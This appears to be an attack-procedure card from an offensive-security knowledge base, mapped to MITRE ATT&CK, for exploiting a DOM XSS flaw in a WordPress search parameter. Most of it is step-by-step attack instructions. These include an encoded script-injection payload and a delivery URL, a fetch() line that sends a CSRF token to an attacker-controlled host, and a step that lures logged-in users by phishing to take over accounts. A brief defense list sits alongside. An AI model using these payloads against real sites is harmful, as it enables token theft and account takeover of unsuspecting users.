---
id: proc-inject-xss-search-payload
name: Inject XSS Payload in Search Parameter
tags:
  - xss
  - dom-xss
  - wordpress
  - token-theft
  - account-takeover
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T03:46:38.304Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Drive-by Compromise]]'
---
# Inject XSS Payload in Search Parameter

## Summary

This procedure exploits a DOM-based XSS vulnerability in a WordPress search parameter by injecting a JavaScript payload to execute arbitrary code, demonstrating the theft of anti-CSRF tokens from authenticated sessions for account takeover.

## Description

The attack leverages the lack of single quote sanitization in the search.js file, where user input from '/?s=' is directly appended to the DOM. By crafting a payload that closes an attribute or tag with a quote and injects a <script> tag, attackers can run JS to access and exfiltrate sensitive data like anti-CSRF tokens stored in cookies or forms. This is effective against all users, including authenticated ones, as the endpoint requires no login. Prerequisites include confirmed vulnerability from prior examination; outcomes range from proof-of-concept alerts to real token theft via network requests.

## Requirements

1. Vulnerable WordPress site with identified search.js flaw
2. Web browser for payload delivery and execution observation
3. Optional authenticated session to test token impact

## Defense

Defensive measures and detection strategies:

- Sanitize all client-side inputs using HTML entity encoding or libraries like he.js
- Enable strict CSP headers to block unsafe-inline scripts
- Log and alert on suspicious script executions or token access patterns in web logs

## Objectives

1. Execute arbitrary JavaScript via search parameter
2. Steal anti-CSRF tokens from DOM or cookies
3. Facilitate account takeover by bypassing CSRF protections

## Instructions

### Step 1: Craft Payload

**Context**: Build an encoded payload to break out of the input context and inject script.

Use URL encoding for the payload: '\"><script>alert(document.domain)</script>' becomes '%27%3E%3Cscript%3Ealert(document.domain)%3C/script%3E'. This exploits the single quote to close any enclosing attribute.

### Step 2: Deliver Payload

**Context**: Visit the target endpoint with the injected parameter to trigger execution.

Construct and navigate to 'https://target.com/?s=%27%3E%3Cscript%3Ealert(document.domain)%3C/script%3E' in a browser. Observe the decoded form in the address bar or dev tools.

**Expected Output**: Alert dialog displaying the domain, confirming JS execution.

### Step 3: Escalate to Token Theft

**Context**: Modify the payload to exfiltrate anti-CSRF tokens once execution is confirmed.

Replace the alert with a fetch or XMLHttpRequest to send token values (e.g., from document.cookie or form fields) to an attacker-controlled server: '<script>fetch("https://attacker.com/steal?token=" + document.querySelector("input[name=\'csrf_token\']").value)</script>'.

**Expected Output**: Network request to attacker server containing the token.

### Step 4: Validate Impact

**Context**: Test against an authenticated user to confirm account takeover potential.

Lure an authenticated user to the payload URL (e.g., via phishing) and use the stolen token to forge requests, such as changing user details.

**Expected Output**: Successful unauthorized actions using the token.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]
- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[dom-xss]]
- [[wordpress]]
- [[token-theft]]
